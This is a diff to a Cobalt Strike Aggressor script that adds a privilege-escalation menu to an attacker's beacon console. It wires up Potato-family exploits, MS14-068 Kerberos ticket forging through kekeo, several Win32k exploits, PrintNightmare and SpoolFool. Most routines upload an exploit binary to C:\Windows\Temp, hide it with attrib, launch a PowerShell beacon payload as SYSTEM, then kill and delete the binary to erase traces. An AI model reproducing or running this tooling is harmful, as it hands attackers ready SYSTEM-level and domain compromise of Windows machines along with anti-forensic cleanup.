@@ -11,6 +11,26 @@ sub Getname{
 }
 
 
+sub EfsPotato{
+    local('$arg');
+    if($3['Pipe'] eq ""){
+        $arg = join(' ', @($3['Command']));
+
+    }else{
+        $arg = join(' ', @($3['Command'],$3['Pipe']));
+    }
+    bexecute_assembly($bid, script_resource("bin/Privilege_escalation/MS16_075/EfsPotato-3.5.exe"),$arg);
+}
+
+sub PrintNotifyPotato{
+    bexecute_assembly($bid, script_resource("bin/Privilege_escalation/MS16_075/PrintNotifyPotato-NET2.exe"),$3["Command"]);
+}
+
+sub BadPotato{
+    bexecute_assembly($bid, script_resource("bin/Privilege_escalation/MS16_075/BadPotato.exe"),$3["Command"]);
+}
+
+
 sub ms16032{
     btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via ms16-032");
     local('$Rch $payload $fname');
@@ -96,11 +116,139 @@ sub UacviaProgIDs{
     }
 }
 
-sub printspoofer {
-    
+sub RunJuicyPotato{
+    local('$payload $handle $call $port $id $fname $total');
+    @array = @("a", "b", "c", "d", "e", "f", "g", "1", "2", "3", "4", "5", "6", "!", "@", "#");
+    $total = 8;
+    $call = $3['Call'];
+    $port = $3['Port'];
+    $id = $3['CLSID'];
+    while($total >= 0){
+        $fname = $fname.rand(@array);
+        $total = $total - 1;
+    }
+    $fname = $fname.".cmd";
+    if ($call eq "CreateProcessWithTokenW"){
+        $call = "t";
+    }
+    else if($call eq "CreateProcessAsUser"){
+        $call = "u";
+    }
+    else{
+        $call = "\*";
+    }
+    if( !-isnumber $port){
+        show_error("The port is not regular. Please enter the number in the range of 1-65535 !");
+        return;
+    }
+    if(($port < 1) || ($port > 65535)){
+        show_error("Port out of range !");
+        return;
+    }
+    $payload = powershell($3['listener'], false);
+    $handle = openf("> $+ $fname");
+    writeb($handle, $payload);
+    closef($handle);
+    bcd($bid,"C:\\Windows\\Temp\\");
+    bupload($bid, script_resource("bin/Privilege_escalation/MS16_075/jp.exe"));
+    bupload($bid, $fname);
+    bshell($bid, "attrib \"jp.exe\" +s +h");
+    bshell($bid, "attrib \" $+ $fname\" +s +h");
+    bshell($bid,"jp.exe -t  $+ $call -l  $+ $port -p  $+ $fname");
+    bshell($bid,"del /F /S /Q /AH jp.exe");
+    bshell($bid,"del /F /S /Q /AH ".$fname);
 }
 
+sub MS14-068{
+    btask($bid, 'Mimkaztz kerberos::purge');
+    bmimikatz($bid, "kerberos::purge");
+    if (-is64 $bid['id']) {
+        btask($bid, 'Is x64 machine');
+        btask($bid, 'Run kekeo.exe');
+        bcd($bid, "C:\\Windows\\Temp\\");
+        bupload($bid, script_resource("bin/Privilege_escalation/MS14-068/x64/kekeo.exe"));
+        bshell($bid,"kekeo.exe \"exploit::ms14068 /domain:".$3["domain"]." /user:".$3["user"]." /password:".$3["password"]." /ptt\" \"exit\"");
+    }else{
+        btask($bid, 'Is not x64 machine');
+        btask($bid, 'Run kekeo.exe');
+        bcd($bid, "C:\\Windows\\Temp\\");
+        bupload($bid, script_resource("bin/Privilege_escalation/MS14-068/Win32/kekeo.exe"));
+        bshell($bid,"kekeo.exe \"exploit::ms14068 /domain:".$3["domain"]." /user:".$3["user"]." /password:".$3["password"]." /ptt\" \"exit\"");
+        }
+    }
+sub CVE_2018_8120{
+    local('$Rch $payload');
+    $Rch = "x86";
+    if (-is64 $bid['id']) {
+        $Rch = "x64";
+    }
+    $payload = powershell($3['listener'], false, $Rch);
+    bcd($bid,"C:\\Windows\\Temp\\");
+    bupload($bid, script_resource("bin/Privilege_escalation/CVE_2018_8120/".$Rch.".exe"));
+    bshell($bid, "attrib \"".$Rch.".exe\" +s +h");
+    bshell($bid,$Rch.".exe \"".$payload."\"");
+    bshell($bid,"taskkill /f /im ".$Rch.".exe");
+    bshell($bid,"del /F /S /Q /AH ".$Rch.".exe");
+    }
 
+
+sub MS15_010{
+    $Rch = "x86";
+    if (-is64 $bid['id']) {
+        $Rch = "x64";
+    }
+    $payload = powershell($3['listener'], false, $Rch);
+    bcd($bid,"C:\\Windows\\Temp\\");
+    bupload($bid, script_resource("bin/Privilege_escalation/MS15-010/ms15-010.exe"));
+    bshell($bid, "attrib \"ms15-010.exe\" +s +h");
+    bshell($bid,"ms15-010.exe \"".$payload."\"");
+    bshell($bid,"taskkill /f /im ms15-010.exe");
+    bshell($bid,"del /F /S /Q /AH ms15-010.exe");
+    }
+
+sub MS15_015{
+    $Rch = "x86";
+    if (-is64 $bid['id']) {
+        $Rch = "x64";
+    }
+    $payload = powershell($3['listener'], false, $Rch);
+    bcd($bid,"C:\\Windows\\Temp\\");
+    bupload($bid, script_resource("bin/Privilege_escalation/MS15-015/MS15-015.exe"));
+    bshell($bid, "attrib \"MS15-015.exe\" +s +h");
+    bshell($bid,"MS15-015.exe \"".$payload."\"");
+    bshell($bid,"taskkill /f /im MS15-015.exe");
+    bshell($bid,"del /F /S /Q /AH MS15-015.exe");
+    }
+
+sub CVE_2019_0803{
+    $Rch = "x86";
+    if (-is64 $bid['id']) {
+        $Rch = "x64";
+    }
+    $payload = powershell($3['listener'], false, $Rch);
+    bcd($bid,"C:\\Windows\\Temp\\");
+    bupload($bid, script_resource("bin/Privilege_escalation/CVE_2019_0803/CVE-2019-0803.exe"));
+    bshell($bid, "attrib \"CVE-2019-0803.exe\" +s +h");
+    bshell($bid,"CVE-2019-0803.exe \"".$payload."\"");
+    bshell($bid,"taskkill /f /im CVE-2019-0803.exe");
+    bshell($bid,"del /F /S /Q /AH CVE-2019-0803.exe");
+    }
+
+sub CVE_2021_1675 {
+    if (-is64 $bid['id']){
+        $arch = "x64";
+        $dll = getFileProper(script_resource("bin/Privilege_escalation/CVE_2021_1675/"), "CVE-2021-1675.x64.dll");
+        bdllspawn($bid, $dll, $3['beacondllfile'], "Local Privilege Escalation of CVE-2021-1675 x64", 5000, true);
+    }
+    else{
+        $arch = "x86";
+        $dll = getFileProper(script_resource("bin/Privilege_escalation/CVE_2021_1675/"), "CVE-2021-1675.x86.dll");
+        bdllspawn($bid, $dll, $3['beacondllfile'], "Local Privilege Escalation of CVE-2021-1675 x86", 5000, true);
+    }
+}
+sub CVE_2022_21999{
+    bexecute_assembly($bid, script_resource("bin/Privilege_escalation/CVE_2022_21999/SpoolFool.exe"),"-dll ".$3["dllfile"]);
+}
 
 menu "提权"{
     item "MS16-032"{
@@ -110,24 +258,24 @@ menu "提权"{
             drow_listener($Dialog, "listener", "Listener: ");
             dbutton_action($Dialog, "Exploit");
             dialog_show($Dialog);
-        }
-     item "Sweet-Potato"{
+    }
+    item "[Mem]Sweet-Potato"{
             $bid = $1['@'];
             $Dialog = dialog("Sweet Potato",%(bid => $bid),&SweetPotato);
             dialog_description($Dialog, "The vulnerability could allow elevation of privilege.");
             drow_listener($Dialog, "listener", "Listener: ");
             dbutton_action($Dialog, "Exploit");
             dialog_show($Dialog);
-        }
-    item "Sweet-Potato-Command"{
+    }
+    item "[Mem]Sweet-Potato-Command"{
             $bid = $1['@'];
             $Dialog = dialog("Sweet Potato Command",%(bid => $bid),&SweetPotato_Command);
             dialog_description($Dialog, "The vulnerability could allow elevation of privilege.");
             drow_text($Dialog, "cmd", "Command:");
             dbutton_action($Dialog, "Exploit");
             dialog_show($Dialog);
-        }
-    item "Printspoofer-dllrefleact"{
+    }
+    item "[Mem]Printspoofer-dllrefleact"{
         btask($1, "Task Beacon to run " . listener_describe($2) . " via PrintSpoofer");
         if (-is64 $1)
         {
@@ -142,7 +290,7 @@ menu "提权"{
         bstage($1, $null, $2, $arch);
         }
     menu "UAC"{
-        item "Bypass uac via ProgIDs"{
+        item "[Mem]Bypass uac via ProgIDs[没成功过]"{
             $bid = $1['@'];
             $dialog = dialog("Bypass UAC via ProgIDs",%(bid => $bid, path => 'C:\\Windows\\System32\\notepad.exe'), &UacviaProgIDs);
             dialog_description($dialog, "Bypass UAC via ProgIDs.");
@@ -152,7 +300,7 @@ menu "提权"{
             dbutton_action($dialog, "Go");
             dialog_show($dialog); 
         }
-        item "&Elevated COM Bypassuc"{
+        item "[Mem]&Elevated COM Bypassuc[好用]"{
             $bid = $1['@'];
             $dialog = dialog("COM DLL Bypassuc", %(executepath => "C:\\Windows\\System32\\cmd.exe", bid => $bid), &combypassuac_);
             dialog_description($dialog, "combypassuac #指定一个要运行的PE文件");
@@ -160,5 +308,104 @@ menu "提权"{
             dbutton_action($dialog, "run");
             dialog_show($dialog);
         }
+    }
+     item "JuicyPotato"{
+            $bid = $1['@'];
+            $Dialog = dialog("Juicy Potato",%(Call =>"Both", Port => "1337", CLSID => "{4991d34b-80a1-4291-83b6-3328366b9097}", bid => $bid),&RunJuicyPotato);
+            dialog_description($Dialog, "A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\\SYSTEM. ");
+            drow_listener($Dialog, "listener", "Listener: ");
+            drow_combobox($Dialog, "Call",  "Createprocess Call: ", @("CreateProcessWithTokenW","CreateProcessAsUser","Both"));
+            drow_text($Dialog, "Port", "Listen Port: ");
+            drow_text($Dialog, "CLSID", "CLSID: ");
+            dbutton_action($Dialog, "Exploit");
+            dialog_show($Dialog);
+    }
+    item "[Mem]BadPotato"{
+            $bid = $1['@'];
+            $Dialog = dialog("BadPotato",%(Command =>"whoami", bid => $bid),&BadPotato);
+            dialog_description($Dialog, "BadPotato");
+            drow_text($Dialog, "Command", "Command: ");
+            dbutton_action($Dialog, "Exploit");
+            dialog_show($Dialog);
+    }
+    item "[Mem]EfsPotato"{
+            $bid = $1['@'];
+            $Dialog = dialog("EfsPotato",%(Command =>"whoami",Pipe => "", bid => $bid),&EfsPotato);
+            dialog_description($Dialog, "pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)");
+            drow_text($Dialog, "Command", "Command: ");
+            drow_text($Dialog, "Pipe", "Pipe: ");
+            dbutton_action($Dialog, "Exploit");
+            dialog_show($Dialog);
+    }
+    item "[Mem]PrintNotifyPotato"{
+            $bid = $1['@'];
+            $Dialog = dialog("PrintNotifyPotato",%(Command =>"whoami", bid => $bid),&PrintNotifyPotato);
+            dialog_description($Dialog, "PrintNotifyPotato. Another potato, using PrintNotify COM service for lifting rights For Windows 10 - 11 Windows Server 2012 - 2022");
+            drow_text($Dialog, "Command", "Command: ");
+            dbutton_action($Dialog, "Exploit");
+            dialog_show($Dialog);
+    }
+    item "[域]MS14-068" {
+        $bid = $1;
+        $dialog = dialog("MS14-068",%(bid => $bid),&MS14-068);
+        dialog_description($dialog, "MS14-068 is a Windows vulnerability in the Key Distribution Center (KDC) service. It allows an authenticated user to insert an arbitrary PAC (a structure that represent all user rights) in its Kerberos ticket (the TGT).");
+        drow_text($dialog, "domain",  "Domain");
+        drow_text($dialog, "user",  "Username");
+        drow_text($dialog, "password",  "Password");
+        dbutton_action($dialog, "GO!");
+        dialog_show($dialog);
+    }
+    item "MS15-010"{
+        $bid = $1['@'];
+        $Dialog = dialog("MS15-010",%(bid => $bid),&MS15_010);
+        dialog_description($Dialog, "when the Win32k component fails to properly handle objects in memory\, aka \"Win32k Elevation of Privilege Vulnerability.\"");
+        drow_listener($Dialog, "listener", "Listener: ");
+        dbutton_action($Dialog, "Exploit");
+        dialog_show($Dialog);
+    }
+    item "MS15-015"{
+        $bid = $1['@'];
+        $Dialog = dialog("MS15-015",%(bid => $bid),&MS15_015);
+        dialog_description($Dialog, "when the Win32k component fails to properly handle objects in memory\, aka \"Win32k Elevation of Privilege Vulnerability.\"");
+        drow_listener($Dialog, "listener", "Listener: ");
+        dbutton_action($Dialog, "Exploit");
+        dialog_show($Dialog);
+    }
+    item "CVE-2018-8120"{
+        $bid = $1['@'];
+        $Dialog = dialog("CVE-2018-8120",%(bid => $bid),&CVE_2018_8120);
+        dialog_description($Dialog, "when the Win32k component fails to properly handle objects in memory\, aka \"Win32k Elevation of Privilege Vulnerability.\"");
+        drow_listener($Dialog, "listener", "Listener: ");
+        dbutton_action($Dialog, "Exploit");
+        dialog_show($Dialog);
+    }
+    item "CVE-2019-0803"{
+        $bid = $1['@'];
+        $Dialog = dialog("CVE-2019-0803",%(bid => $bid),&CVE_2019_0803);
+        dialog_description($Dialog, "when the Win32k component fails to properly handle objects in memory\, aka \"Win32k Elevation of Privilege Vulnerability.\"");
+        drow_listener($Dialog, "listener", "Listener: ");
+        dbutton_action($Dialog, "Exploit");
+        dialog_show($Dialog);
+    }
+    item "[Mem]CVE-2021-36934"{
+        $bid = $1['@'];
+        blog($bid,"正在执行 CVE-2021-36934 提权");
+        bexecute_assembly($bid, script_resource("bin/Privilege_escalation/CVE_2021_36934/CVE-2021-36934.exe"));
+    }
+    item "[Mem]CVE-2021-1675(PrightNightMareLPE)" {
+        $bid = $1['@'];
+        $Dialog = dialog("CVE-2021-1675",%(bid => $bid),&CVE_2021_1675);
+        dialog_description($Dialog, "PrintNightMare LPE 提权漏洞,适用 WinSer 2019、WinServer 2016环境。需要手动上传 Beacon.dll 到目标,然后目标 dll 路径填写到下面编辑框即可。将如果最终返回0，说明是可以利用成功的，有可能不太稳定，可以多尝试几次");
+        drow_text($Dialog, "beacondllfile", "Target Beacon DLL Path: ");
+        dbutton_action($Dialog, "Exploit");
+        dialog_show($Dialog);
+    }
+    item "[Mem]CVE-2022-21999(SpoolFool)" {
+        $bid = $1['@'];
+        $Dialog = dialog("CVE-2022-21999",%(bid => $bid),&CVE_2022_21999);
+        dialog_description($Dialog, "Windows Print Spooler 存在权限提升漏洞，经过身份认证的本地攻击者可通过在目标系统上运行特制程序来利用此漏洞，成功利用此漏洞的攻击者可在目标系统上以 SYSTEM 权限执行任意代码. link:https://github.com/ly4k/SpoolFool");
+        drow_text($Dialog, "dllfile", "Target DLL Path: ");
+        dbutton_action($Dialog, "Exploit");
+        dialog_show($Dialog);
     }
 }
